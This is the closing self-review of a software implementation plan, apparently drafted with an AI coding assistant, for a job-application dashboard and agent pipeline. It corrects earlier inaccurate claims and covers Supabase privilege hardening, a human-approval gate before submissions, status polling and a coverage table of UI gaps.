Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

## Self-Review

**This section was rewritten after a senior-engineer review found 7 Critical + 12 Important +
17 Minor findings against an earlier draft of this plan.** All 36 were addressed (one Minor,
M9, by an explicit swap rather than a "fix" per se). The original version of this section
claimed a completed cross-task consistency pass, a clean placeholder scan, and verified type
consistency across Tasks 3/6/7/9's fixtures — that claim was **inaccurate**: the review found
three places where this plan's own "tests pass" checkpoints would have been false in practice
(C1: a pre-existing test needed a `db.record_submission` mock it didn't have, or it would hang
~6s and fail; C2: a pre-existing test directly contradicted this plan's own new behavior and was
never deleted; C6: a two-row e2e fixture change in Task 7 broke an unscoped locator in a test
Task 3 had already written), one real ambiguity in a "verify it fails" step (I6), and a false
claim about the vitest fixtures' completeness (below). Corrections made in response, by
category:

- **Security-critical (C3-C5, C7, I1-I2):** a companion `reset_approval` RPC (Task 1) so a
  failed GitHub dispatch can't permanently brick a row behind a set `approved_at`; `SECURITY
  DEFINER` `search_path` hardened to `public, pg_temp` and the default `PUBLIC` execute grant
  revoked before the `anon` grant, on both RPCs; the anon `UPDATE`/`INSERT` column allowlist is
  now derived dynamically from `information_schema` instead of hand-enumerated, and `INSERT` was
  added alongside `UPDATE` (an anon `INSERT` could otherwise preset `approved_at` on a new row);
  Task 1's verification now includes real anon-key `curl` calls through PostgREST (Step 6b/6c),
  not just CLI-superuser checks, since those are what actually validates what the frontend
  experiences.
- **The gate itself (C4):** `apply_agent.py`'s `submit()` now actually requires `approved_at`
  truthy (Task 6) — before this fix, nothing in the system ever read the column Task 1 added,
  and the `workflow_dispatch`-triggerable GHA workflow remained an open bypass of the entire
  ARMED-gate design this column exists to enforce.
- **Test-integrity (C1, C2, C6, I4, I5):** see the three checkpoint corrections above; also
  `test_submit_does_not_click_submit_when_not_armed` and
  `test_submit_raises_and_leaves_stage_unchanged_when_confirmation_is_missing` had their patched
  target renamed from the now-dead `db.update_job_application_stage` to `db.record_submission`
  (I4); the CAPTCHA-blocked test in Task 8 now asserts the one property (`status == "blocked"`)
  that actually distinguishes the fix from today's unfixed behavior (I5).
- **Status polling redesign (I8):** Task 7 now polls a new `GET /api/applications/[id]` for one
  row instead of re-fetching the stage-filtered list — the earlier design could never
  distinguish "still running" from "the submission failed," since a stuck `ready_to_submit` row
  looked identical either way and always burned the full 90s timeout on a failure.
- **UI edit correctness (I7, I11):** `ApplicationDetailSheet` gains an `onSaved` callback so a
  saved `apply_preview` edit actually propagates back into `ApplicationsPage`'s state instead of
  silently going stale in the table and on the next sheet open (I7); the `/files` route's
  `signIfPresent` now distinguishes "no file on record" from "couldn't sign it right now" (I11)
  — previously identical, on the one screen whose entire purpose is reviewing a resume before a
  real submission.
- **Health strip (I3, I9):** the `agent_runs_latest_by_source` view is now `security_invoker`
  with an explicit column list, not `SELECT *`; `SystemHealthStrip` now has a real error state
  distinct from "loaded, nothing to show," a known-sources list so a source that stops reporting
  renders "never ran" instead of vanishing, and a per-source staleness threshold.
- **Everything else:** the ambiguous `apply_preview` PATCH test assertions now check the
  discriminating error message (I6); the false "`errors` stays 0" claim about `cu_linkedin.py`'s
  CAPTCHA branch is corrected everywhere it appeared, including the commit message text (M17);
  `statusVariant` swaps `blocked`→amber / `failure`→red (M9); plus the full list of smaller
  fixes in Tasks 1-9 above (dynamic-column rollback comment, constraint-discovery fallback,
  mock-chain and locator-strictness fixes, `db-schema.md` doc steps, `sessionStorage`
  persistence for `submittingIds`, the lint step, and more).

**1. Spec coverage against every U1-U15 gap:**

| Gap | Task | Covered by | Status |
|---|---|---|---|
| U1 | 3 | `ApplicationDetailSheet.tsx` resume/cover-letter iframe sections + `/api/applications/[id]/files` | Full |
| U2 | 3 | Job section rendering `job_url` + `posting_snapshot` (description/responsibilities/qualifications/benefits/location, string or array) | Full |
| U3 | 4 | Apply-preview section (platform/field_values/answers) | Full |
| U4 | 7 | `ConfirmModal` (reused) wired into Approve | Full |
| U5 | 7 | `submittingIds` state + single-row poll (I8) + toast; blocked/failed state surfaces `apply_blocked_reason` with a Try again action | **Partial** — a permanent-dispatch-infra outage past the 90s timeout still ends in the ambiguous "still processing" message; no push/webhook-based completion signal exists, only polling |
| U6 | 5 | Pick section: verdict badge, score, full (untruncated) reasoning | Full |
| U7 | 6 | Stage `<Select>` filter | Full |
| U8 | 6 | `db.record_submission` writes `source_channel`; table renders it | Full |
| U9 | 5 | `pickVerdictVariant` badge color mapping | Full |
| U10 | 2 | `[id]/route.ts` imports the shared `JOB_APPLICATION_STAGES` instead of a stale local array | Full |
| U11 | 2 (backend), 4 (frontend) | PATCH accepts `apply_preview`; sheet renders editable answer fields + Save; `onSaved` propagates the result (I7) | **Partial** — a concurrent edit from two open tabs/sessions on the same row has no conflict detection (last write wins); acceptable for a single-operator tool, documented rather than silently true |
| U12 | 6 | Source `<Select>` filter + Source column | Full |
| U13 | 8 (view), 9 (strip) | `agent_runs_latest_by_source` (now `security_invoker`, explicit columns) + `SystemHealthStrip` (error state, staleness, known-sources) | **Partial** — the known-sources list (`KNOWN_SOURCES` in `SystemHealthStrip.tsx`) is a hand-maintained constant; a genuinely new source still shows up via the "extra rows" fallback, but won't get a real staleness threshold until someone adds one to `SOURCE_MAX_AGE_MINUTES` |
| U14 | 8 (backend signal), 9 (frontend badge) | `record_run('blocked', ...)` + widened CHECK + attention banner with VNC link | **Partial** — `NEXT_PUBLIC_BEELINK_VNC_URL` is documented but not actually set anywhere real by this plan (M8); the banner correctly degrades until an operator sets it in Vercel |
| U15 | 5 | Cost section (folded into the same task as U6/U9 per the plan's own task-decomposition guidance) | Full |

Data model changes: `approved_at` column + `approve_application`/`reset_approval` RPCs — Task 1. RLS — explicitly NOT enabled, per the final override in this plan's Global Constraints (documented deviation from the spec document's own RLS paragraph). `agent_runs.source` load-bearing for U13 — Task 8/9. No new table for LinkedIn — confirmed unchanged; no task needed (`cu_linkedin.py` already writes into `job_applications` via the existing `create_job_application(..., source='linkedin')` path).

**2. Placeholder scan:** no `TBD`, `implement later`, or bare prose-only code steps found. The one intentionally-deferred concrete value (Task 9 Step 17's "use the real numbers from Step 15's output") is an operational instruction with a stated concrete mechanism, not a content placeholder — this plan cannot know the exact final test count before the suite actually runs, and hardcoding a guessed number would be worse (silently wrong) than instructing the executor to read it from real output.

**3. Type consistency check:** `JobApplication` (Task 2) gains exactly the five fields every later task reads: `source_channel`, `resume_cost_usd`, `resume_tokens_input`, `resume_tokens_output`, `approved_at` — cross-checked against Task 3 (`ApplicationDetailSheet`'s resume section doesn't need them but Task 5's cost section does), Task 5 (`resume_cost_usd`/`resume_tokens_input`/`resume_tokens_output` read with the exact names), Task 6 (`source_channel` read with the exact name), the e2e `page.route` fixtures in Tasks 3/6/7/9 (all include the full field set), and now also the vitest `sampleApplications`/`pickedApplication`/`blockedApplication` fixtures in Task 3 (I12 — an earlier draft of this section claimed these were already complete; they weren't, until this revision added `source_channel`, the three cost fields, and `approved_at` to each). `SystemHealthRow` lives in `lib/types.ts` (M6), imported by both the route and the component rather than the component importing a type from the route file. `pickVerdictVariant` (Task 5) is imported with the same name and signature in both `ApplicationDetailSheet.tsx` and `ApplicationsPage.tsx`. `db.record_submission(application_id, source_channel, applied_date)` (Task 6) is called with exactly three positional args from `apply_agent.py`, matching the test's `assert_called_once_with(1, "greenhouse", "2026-09-24")`. The `approve_application`/`reset_approval` RPCs' Postgres signature (`BIGINT`) matches every call site: `supabase.rpc(...)` in Tasks 2 and 7, and the manual verification in Task 1.

## Judgment calls and deviations from the task's guidance, recorded for the record

- **Cost display (U15)** was folded into Task 5 (alongside U6/U9), not Task 3 — the task prompt allowed either; Task 5 already touches the Pick section of the same file for the same "simple read-only field rendering" reason, so grouping them avoided a third near-trivial touch of `ApplicationDetailSheet.tsx`.
- **`REVOKE UPDATE (approved_at) ... FROM anon` alone does not work — and neither does `INSERT`.** Verified live against the production Supabase project before writing Task 1: `anon` holds blanket table-level `UPDATE` and `INSERT` grants (Supabase's own bootstrap), and Postgres column-level revokes do not carve exceptions out of table-level grants. Task 1 instead revokes both table-level privileges entirely and re-grants each on a column list derived dynamically from `information_schema` (every existing column except `approved_at`), verified live in Task 1 Steps 5-6c. This is a correction to a plausible-sounding but incorrect literal reading of the design brief's SQL snippet, not a deviation from its intent.
- **Anon `stage` writes are deliberately still allowed (M15).** The spec's original ask was to deny anon writes to both `approved_at` and `stage`. This plan's column allowlist necessarily keeps `stage` anon-writable — every Python writer (`job_pick.py`, `apply_agent.py`, `cu_linkedin.py`, `resume_agent.py`) and every Next.js route needs it, and there is no second, more-privileged credential to give any of them instead (see Global Constraints — one shared anon key for everything). `approved_at` is the property that actually needs protecting (it's the ARMED gate); `stage` is a shared, heavily-written column with no single owner and no plausible way to lock it down without breaking one of four scripts. This is a deliberate, scoped deviation from the spec's literal ask, not an oversight — recorded here explicitly per the senior-engineer review (M15), and also noted inline in Task 1's migration header comment.
- **U13's health data source is a `DISTINCT ON` view, not a windowed "recent rows, reduce client-side" query.** A practically-sized window would never contain a row from a quarterly-cadence source (`visa_ingest_lca`, `visa_ingest_uscis`), and a missing chip reads as "healthy" — exactly the failure U13 exists to prevent. The view is read-only, `security_invoker`, and adds no write-path risk.
- **`supabase-js`'s `.rpc()` does not throw on a Postgres exception** — it resolves with `{ data, error }`. Task 2's submit-route implementation checks `error` explicitly; an earlier draft of this plan's reasoning assumed a `try/catch` would suffice, which would have silently reintroduced the exact hole the RPC gate exists to close (the route would dispatch the ARMED workflow even when the RPC rejected the row).
- **`GET /api/applications/[id]` now exists (I8), added to Task 7, not Task 2** — an earlier draft of this plan stated it didn't exist and that polling reused the stage-filtered list; that design couldn't distinguish "still running" from "the submission failed." It was added to the same `[id]/route.ts` file Task 2 already modifies (matching that file's existing pattern) rather than as a separate new file, and its test lives in that file's existing test file per the same reasoning.
- **`update_job_application_stage` is not removed** even though `apply_agent.py`'s `submit()` no longer calls it (Task 6 replaces that one call site with `db.record_submission`) — three existing tests patch it defensively without asserting it was called with specific "applied" semantics; removing the function would be an unrelated, unnecessary cleanup outside this plan's scope, and keeping it costs nothing.
- **Radix `<Select>` mock:** `ApplicationsPage.tsx` renders many concurrent `Select` instances (one per table row plus two filters) once Task 6 lands. The single-shared-variable mock pattern used elsewhere in this codebase (`ContactsFilters.test.tsx`) is correct only when few `Select`s are mounted at once; Task 6 instead threads each instance's `onValueChange` through React context so a click on one `Select`'s option cannot silently fire a different `Select`'s handler.
- **`SystemHealthStrip`'s known-sources list and per-source staleness thresholds are hand-maintained constants (I9), not derived from anything live.** A brand-new `agent_runs.source` value still renders (the "extra rows" fallback), but without a real staleness threshold until someone adds one — flagged as a partial/follow-up in the coverage table above rather than silently treated as fully solved.
